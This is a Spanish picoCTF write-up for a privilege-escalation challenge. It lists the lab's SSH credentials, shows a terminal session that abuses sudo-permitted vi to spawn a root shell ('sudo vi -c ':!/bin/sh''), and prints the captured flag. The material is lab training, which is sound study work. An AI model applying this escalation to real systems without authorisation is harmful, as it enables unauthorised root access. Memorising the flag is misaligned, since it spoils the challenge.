## Descripción 
Can you read files in the root file?The system admin has provisioned an account for you on the main server:`ssh -p 62353 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?

Hint:
1. What permissions do you have?
## Solución 1

Con consola linux
Nos conectamos al servidor mediante ssh y usamos cd  / y ls para ver el contenido
Después nos metemos al sudo l-para tener más permisos y nos dice que podríamos usar unos comandos el que nos interesa es el vi, luego buscamos comandos que usen vi y copiamos uno que nos funcione para lo que necesitemos para entrar con más privilegios y ahí entramos al root y vemos el contenido y sacamos la flag con un cat

```
vSalazarZ-picoctf@webshell:~$ ssh -p 65471 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:65471 ([13.59.203.175]:65471)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:8: [hashed name]
    ~/.ssh/known_hosts:10: [hashed name]
    ~/.ssh/known_hosts:11: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:13: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:65471' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
picoplayer@challenge:/$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:/$ sudo vi -c ':!/bin/sh' /dev/null

# ls
bin  boot  challenge  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
# cd root
# ls
# ls -al
total 12
drwx------ 1 root root   23 Aug  4  2023 .
drwxr-xr-x 1 root root   51 Feb 22 02:59 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
# 

flag: picoCTF{uS1ng_v1m_3dit0r_021d10ab}
```

## Referencias
https://gtfobins.github.io/gtfobins/vi/